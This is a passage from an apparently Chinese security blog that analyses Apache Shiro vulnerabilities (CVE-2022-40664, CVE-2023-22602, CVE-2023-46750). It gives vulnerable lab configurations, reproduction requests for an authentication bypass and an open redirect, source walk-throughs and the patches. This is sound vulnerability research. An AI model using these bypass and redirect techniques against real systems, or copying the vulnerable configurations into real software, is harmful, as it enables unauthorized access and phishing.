<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210211242446.png"></p>
<h4 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>设置了<code>Pattern.DOTALL</code>标志位</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250210211739965.png"></p>
<h4 id="参考链接-8"><a href="#参考链接-8" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/eFUbnTTxL-_aU0AcIg5edQ">https://mp.weixin.qq.com/s/eFUbnTTxL-_aU0AcIg5edQ</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Lay0us/CVE-2022-32532">Lay0us&#x2F;CVE-2022-32532: Apache Shiro CVE-2022-32532</a></p>
<h3 id="CVE-2022-40664"><a href="#CVE-2022-40664" class="headerlink" title="CVE-2022-40664"></a>CVE-2022-40664</h3><blockquote>
<p>Apache Shiro before 1.10.0, Authentication Bypass Vulnerability in Shiro when forwarding or including via RequestDispatcher.</p>
</blockquote>
<h4 id="漏洞信息-12"><a href="#漏洞信息-12" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.10.0</code></p>
<p>漏洞成因：经过forward的请求不会调用SpringShiroFilter进行过滤。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/d9a75a420f691a700fabc9464f049bd9c9267925#diff-b22e4b1f8be1c9e1e65de7746cfef5ae42b77aefd1fba93d947f7d9ca3c7342a">Allow for direct configuration of ShiroFilter through WebEnvironment · apache&#x2F;shiro@d9a75a4</a></p>
<h4 id="漏洞环境-13"><a href="#漏洞环境-13" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>添加接口</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/cmisl&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2022_40664_test</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;forward:/CVE-2022-40664&quot;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping(&quot;/CVE-2022-40664&quot;)</span>  </span><br><span class="line"><span class="meta">@ResponseBody</span>  </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">CVE_2022_40664</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>配置类如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>  </span><br><span class="line">    <span class="keyword">public</span> SecurityManager <span class="title function_">securityManager</span><span class="params">(Realm realm)</span> &#123;  </span><br><span class="line">        <span class="type">DefaultWebSecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>();  </span><br><span class="line">        securityManager.setRealm(realm);  </span><br><span class="line">        <span class="keyword">return</span> securityManager;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>  </span><br><span class="line">    <span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">shiroFilter</span><span class="params">(SecurityManager securityManager)</span> &#123;  </span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();  </span><br><span class="line">        shiroFilterFactoryBean.setSecurityManager(securityManager);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 配置登录和未授权的页面  </span></span><br><span class="line">        shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/login&quot;</span>);  </span><br><span class="line">        shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/unauthorized&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">// 配置路径权限  </span></span><br><span class="line">        Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;(); </span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2022-40664&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);  </span><br><span class="line">        filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);  </span><br><span class="line">	shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap); </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> shiroFilterFactoryBean;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>  </span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>  </span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean&lt;AbstractShiroFilter&gt; <span class="title function_">shiroFilterRegistration</span><span class="params">(ShiroFilterFactoryBean shiroFilterFactoryBean)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        FilterRegistrationBean&lt;AbstractShiroFilter&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>&lt;&gt;();  </span><br><span class="line">        <span class="comment">// 获取 ShiroFilter 的实例  </span></span><br><span class="line">        registrationBean.setFilter(shiroFilterFactoryBean.getObject());  </span><br><span class="line">        <span class="comment">// 设置 DispatcherType</span></span><br><span class="line">		registrationBean.setDispatcherTypes(DispatcherType.REQUEST, DispatcherType.FORWARD);  </span><br><span class="line">        <span class="keyword">return</span> registrationBean;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>shiroFilterRegistration方法的配置是为了保证forward和include的请求也能经过SpringShiroFilter，因此如果没有这个配置，哪怕本身代码没有该漏洞中的bug，也能直接绕过。</p>
<p>权限路径配置：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/CVE-2022-40664&quot;</span>, <span class="string">&quot;authc, roles[admin]&quot;</span>);</span><br><span class="line">filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>根据上面的配置，<code>/CVE-2022-40664</code>是需要管理员权限的，因此访问是会重定向到登录页面，而<code>/cmisl</code>是无限权限的，不过他会重定向到<code>/CVE-2022-40664</code>。</p>
<h4 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问<code>/CVE-2022-40664</code>，由于没有权限302跳转：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250211190857838.png"></p>
<p>访问<code>/cmisl</code>，可以直接获取<code>/CVE-2022-40664</code>中的资源：</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250211191005212.png"></p>
<h4 id="漏洞分析-13"><a href="#漏洞分析-13" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>问题出在OncePerRequestFilter类，该类的作用是确保每个请求只执行一次过滤器逻辑。通过检查请求属性判断是否已过滤，若未过滤且启用状态为真，则调用 doFilterInternal 方法执行具体过滤逻辑。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212024016138.png"></p>
<p>具体逻辑如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[开始] --&gt; B&#123;请求是否已过滤&#125;</span><br><span class="line">    B --&gt;|是| C[记录日志并调用下一个过滤器]</span><br><span class="line">    B --&gt;|否| D&#123;过滤器是否启用&#125;</span><br><span class="line">    D --&gt;|否| E[记录日志并调用下一个过滤器]</span><br><span class="line">    D --&gt;|是| F&#123;是否应过滤当前请求&#125;</span><br><span class="line">    F --&gt;|否| E</span><br><span class="line">    F --&gt;|是| G[设置已过滤标记]</span><br><span class="line">    G --&gt; H[执行过滤逻辑]</span><br><span class="line">    H --&gt; I[移除已过滤标记]</span><br><span class="line">    I --&gt; J[调用下一个过滤器]</span><br></pre></td></tr></table></figure>

<p>我们的请求是&#x2F;cmisl，首先if语句会判断springShiroFilter.FILTERED属性是否null，不是的话这个请求会进入到第二个if语句里，并且会将请求添加shiroFilter.FILTERED&#x3D;true属性。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212032025667.png"></p>
<p>而经过forward转发的请求，其实和之前的还是一个请求对象，而刚刚我们在第二个if语句中为请求添加了添加shiroFilter.FILTERED&#x3D;true属性，因此转发请求&#x2F;CVE-2022-40664是会进入第一个if语句中，而第一个if语句是认为请求已经经过了SpringShiroFilter过滤器的过滤了，记录日志之后调用下一个过滤器。所以转发后的请求是没有调用SpringShiroFilter。</p>
<h4 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>在第一个if语句判断请求是否已过滤时，除了原来shiroFilter.FILTERED属性不为null之外添加filterOncePerRequest也为True的这个条件保证转发后的请求也会调用SpringShiroFilter。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212033053898.png"></p>
<h4 id="参考链接-9"><a href="#参考链接-9" class="headerlink" title="参考链接"></a>参考链接</h4><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?search_click_id=2856539229316766385-1739293977729-8707173084&__biz=MzIyNTA5Mzc2OA==&mid=2651134445&idx=1&sn=0c0be86211078a8761d16aa1fdad25a2&chksm=f3f5480ac482c11c2d5c9c9a4b3e7ac03a10e6c3594df505e99677f305c87fa575ad2be8f2e7&scene=7&key=daf9bdc5abc4e8d0ade49e15bcdffe1650fe752cdbc0a3aa10073908e51070b0950a4822a089ed87576e72c204b5e01372a1749740ed6ed5db68fe0a25c562d3b9e812e58db0302d0c1b4583e3e431c5ea7ef79ba27ad35eacd640e180b2e2e496643f9421ead899a3be64565d66b2ec58caa5b213819e8642a0a3c5aa0307f7&ascene=0&uin=MjkwNDc1MjU4&devicetype=Windows+11+x64&version=63090c11&lang=zh_CN&exportkey=n_ChQIAhIQnKt2jTO6Xw35AgiIpnDwoRLmAQIE97dBBAEAAAAAAPmGK4h4/x0AAAAOpnltbLcz9gKNyK89dVj0X0VKOhIIpuav+H6NFOKKocVxbHt5QZMC1V+pzBSUSo2nIwKfPyVJj18Mls7rJRSsteJ4a1zsSU+WE4+UGltwnFt8jHzv+GSNuBYRUeQNMmmoI/C7H0OOVyxSpKaiwlMusbn/WjgEc1L5TKdHruJxNrg1VOV1GWmL6oo6G1clsYC+DaH99TFEmvCO83npVwNOPBFCKsFu2xCeJ60rGQxq/P4IeG60jambwTeDPaHmz07+NBtldGITdCxDFZGwAubp&acctmode=0&pass_ticket=nLnNFNjGL9nwjX79jDJOX45Cp1TEOyt+g/Z4RxdLYilDWyYPve2vryUbhEp4yPxP&wx_header=1">【漏洞分析】Apache Shiro身份验证绕过漏洞（CVE-2022-40664）</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/421022.html">Shiro CVE-2022-40664 请求转发导致的验证绕过 - FreeBuf网络安全行业门户</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrsl/p/5045942.html">关于filter过滤器为何不能过滤转发的请求 - mrsl - 博客园</a></p>
<h3 id="CVE-2023-22602"><a href="#CVE-2023-22602" class="headerlink" title="CVE-2023-22602"></a>CVE-2023-22602</h3><blockquote>
<p>When using Apache Shiro before 1.11.0 together with Spring Boot 2.6+, a specially crafted HTTP request may cause an authentication bypass. The authentication bypass occurs when Shiro and Spring Boot are using different pattern-matching techniques. Both Shiro and Spring Boot &lt; 2.6 default to Ant style pattern matching.<br>Mitigation:** Update to Apache Shiro 1.11.0, or set the following Spring Boot configuration value:</p>
</blockquote>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring.mvc.pathmatch.matching-strategy</span> = <span class="string">ant_path_matcher</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>Credit:</strong> Apache Shiro would like to thank v3ged0ge and Adamytd for reporting this issue.</p>
</blockquote>
<h4 id="漏洞分析-14"><a href="#漏洞分析-14" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从Spring Boot 2.6开始，默认的匹配策略已经改为PathPatternParser。(原来是AntPathMatcher)</p>
<p>该漏洞就是CVE-2020-17510补丁因为SpringBoot版本过高而失效造成的，因此payload相同，我们回顾一下CVE-2020-17510的漏洞修复分析：</p>
<p>Shiro新增了一个ShiroUrlPathHelper类，是UrlPathHelper的子类，重写了 <code>getPathWithinApplication</code> 和 <code>getPathWithinServletMapping</code>两个方法，也就是让Spring处理URI的方式用了和Shiro一样的<code>WebUtils#getPathWithinApplication</code>方法。让Shiro和Spring以相同的方式处理URI，避免差异化导致的问题。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125154825868.png"></p>
<p>在配置类import导入了ShiroRequestMappingConfig类。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125203410107.png"></p>
<p>这个类就会将RequestMappingHandlerMapping#urlPathHelper设置ShiroUrlPathHelper。使得Spring会用ShiroUrlPathHelper，也就是Shiro的处理方式去处理路径。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250125205226572.png"></p>
<p>看起来修复的很完美，但在Spring的高版本中，patternParser默认值是true，因此会走默认的UrlPathHelper.defaultInstance来处理，而不是ShiroUrlPathHelper。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250126051411029.png"></p>
<p>所以这个漏洞不能Spring版本太高或太低，如果太低，由于alwaysUseFullPath为false会获得Servlet路径清洗处理后的剩余路径。如果版本太高，又会因为patternParser默认值是true走走默认的UrlPathHelper.defaultInstance。</p>
<p>所以在学习CVE-2020-17510的过程中就已经顺带学习到了该漏洞，不过多赘述。</p>
<h4 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>匹配模式改为ANT_PATH_MATCHER使得patternParser值为false，走向ShiroUrlPathHelper来处理。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212043801674.png"></p>
<h3 id="CVE-2023-46750"><a href="#CVE-2023-46750" class="headerlink" title="CVE-2023-46750"></a>CVE-2023-46750</h3><blockquote>
<p>URL Redirection to Untrusted Site (‘Open Redirect’) vulnerability when “form” authentication is used in Apache Shiro.<br><strong>Mitigation:</strong> Update to Apache Shiro 1.13.0+ or 2.0.0-alpha-4+.</p>
</blockquote>
<h4 id="漏洞信息-13"><a href="#漏洞信息-13" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><p>影响版本：<code>shiro &lt; 1.13.0</code></p>
<p>漏洞成因：在使用 Apache Shiro 的“表单”身份验证时，存在 URL 重定向到不受信任网站（“开放重定向”）的漏洞。</p>
<p>漏洞补丁：<a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/d62387dc576a56a694f0353b3245a892f2f28835">Add tests for SavedRequest redirects · apache&#x2F;shiro@d62387d</a></p>
<h4 id="漏洞环境-14"><a href="#漏洞环境-14" class="headerlink" title="漏洞环境"></a>漏洞环境</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--shiro-spring--&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.12.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span>  </span><br><span class="line"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title function_">shiroFilter</span><span class="params">(SecurityManager securityManager)</span> &#123;  </span><br><span class="line">    <span class="type">ShiroFilterFactoryBean</span> <span class="variable">shiroFilterFactoryBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();  </span><br><span class="line">    shiroFilterFactoryBean.setSecurityManager(securityManager);  </span><br><span class="line">  </span><br><span class="line">    shiroFilterFactoryBean.setLoginUrl(<span class="string">&quot;/toLogin&quot;</span>);  </span><br><span class="line">    shiroFilterFactoryBean.setUnauthorizedUrl(<span class="string">&quot;/unauthorized&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> <span class="title class_">LinkedHashMap</span>&lt;&gt;();  </span><br><span class="line">    filterChainDefinitionMap.put(<span class="string">&quot;/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> shiroFilterFactoryBean;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="漏洞复现-14"><a href="#漏洞复现-14" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>访问<code>//baidu.com</code>，会302跳转到登录接口，同时设置Cookie。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212190745689.png"></p>
<p>然后将跳转到登录接口的数据包发送，带上上一次返回包的Cookie，通过返回包可以看到是要将我们重定向到<code>http://baidu.com</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250212190813515.png"></p>
<p>因此这里是存在一个重定向的漏洞。</p>
<h4 id="漏洞分析-15"><a href="#漏洞分析-15" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据官网漏洞描述，漏洞主要来源于 “form” authentication，在使用 Apache Shiro 的“表单”身份验证时，存在 URL 重定向到不受信任网站（“开放重定向”）的漏洞。所以可以把目光集中在<code>org.apache.shiro.web.filter.authc.FormAuthenticationFilter</code>上。</p>
<p>我在在核心方法onAccessDenied上打上断点，这个方法主要是做一些拒绝访问的一些后续操作，比如拦截之后，需要将你重定向到登录页面，登录之后再让你返回你之前想要访问的页面，问题就出在我们可以在请求中访问任意网站，在登录后可以重定向到我们输入的网站。</p>
<p>打上断点我们访问<code>//baidu.com</code>，首先就是判断这是不是一个登录请求，是的话进入if语句中，否则进入else语句。显然我们访问的不是。于是进入else。这里主要是执行了一个saveRequestAndRedirectToLogin方法，从方法名不难看出这是保存请求并重定向到登录页面。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213044349836.png"></p>
<p>分为两步，先用WebUtils.saveRequest方法保存请求，再用WebUtils.issueRedirect方法去重定向到登录页面。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">saveRequestAndRedirectToLogin</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="built_in">this</span>.saveRequest(request);  </span><br><span class="line">    <span class="built_in">this</span>.redirectToLogin(request, response);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">saveRequest</span><span class="params">(ServletRequest request)</span> &#123;  </span><br><span class="line">    WebUtils.saveRequest(request);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">redirectToLogin</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">    <span class="type">String</span> <span class="variable">loginUrl</span> <span class="operator">=</span> <span class="built_in">this</span>.getLoginUrl();  </span><br><span class="line">    WebUtils.issueRedirect(request, response, loginUrl);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进入WebUtils.saveRequest方法，创建了一个会话session，然后将请求处理成SavedRequest类的一个实例，很简单的一个类，里面三个参数分别是请求类型，请求参数和请求URI。然后将这个实例保存为会话session的shiroSavedRequest属性。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213044911556.png"></p>
<p>然后是重定向到登录页面。通过WebUtils.issueRedirect方法后续调用到ResponseFacade#sendRedirect方法完成重定向。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213045439400.png"></p>
<p>接着我们发送登录的数据包，带上刚刚302跳转时给我们的Cookie。</p>
<p>还是在FormAuthenticationFilter#onAccessDenied方法。这次因为是登录请求，所以可以直接进入if语句。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213045950638.png"></p>
<p>主要是调用了AuthenticatingFilter#executeLogin方法执行登录逻辑。首先获取token，也就是登录凭证，比如账号密码，验证身份。成功后调用onLoginSuccess方法</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213050049680.png"></p>
<p>这个方法调用了WebUtils#redirectToSavedRequest，重定向到savedrequest，也就是登录之后会重定向去savedrequest的URI，也就是我们之前保存的请求。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">onLoginSuccess</span><span class="params">(AuthenticationToken token, Subject subject, ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">    <span class="built_in">this</span>.issueSuccessRedirect(request, response);  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">issueSuccessRedirect</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">    WebUtils.redirectToSavedRequest(request, response, <span class="built_in">this</span>.getSuccessUrl());  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20250213050605754.png"></p>
<p>其中几个方法代码如下，先获取用户主体的会话session，然后从session中获取shiroSavedRequest属性，正是我们之前保存的SavedRequest实例。这个实例中的RequestUrl属性就是我们之前保存的请求URI，也就是<code>//baidu.com</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SavedRequest <span class="title function_">getAndClearSavedRequest</span><span class="params">(ServletRequest request)</span> &#123;  </span><br><span class="line">    <span class="type">SavedRequest</span> <span class="variable">savedRequest</span> <span class="operator">=</span> getSavedRequest(request);  </span><br><span class="line">    <span class="keyword">if</span> (savedRequest != <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();  </span><br><span class="line">        <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> subject.getSession();  </span><br><span class="line">        session.removeAttribute(<span class="string">&quot;shiroSavedRequest&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> savedRequest;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> SavedRequest <span class="title function_">getSavedRequest</span><span class="params">(ServletRequest request)</span> &#123;  </span><br><span class="line">    <span class="type">SavedRequest</span> <span class="variable">savedRequest</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();  </span><br><span class="line">    <span class="type">Session</span> <span class="variable">session</span> <span class="operator">=</span> subject.getSession(<span class="literal">false</span>);  </span><br><span class="line">    <span class="keyword">if</span> (session != <span class="literal">null</span>) &#123;  </span><br><span class="line">        savedRequest = (SavedRequest)session.getAttribute(<span class="string">&quot;shiroSavedRequest&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> savedRequest;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就和之前一样，拿着该URI进行一个重定向。Response#sendRedirect方法会对URI进一步处理，比如<code>//baidu.com</code>，没有协议头后续在Response#toAbsolute方法会添加协议头。</p>
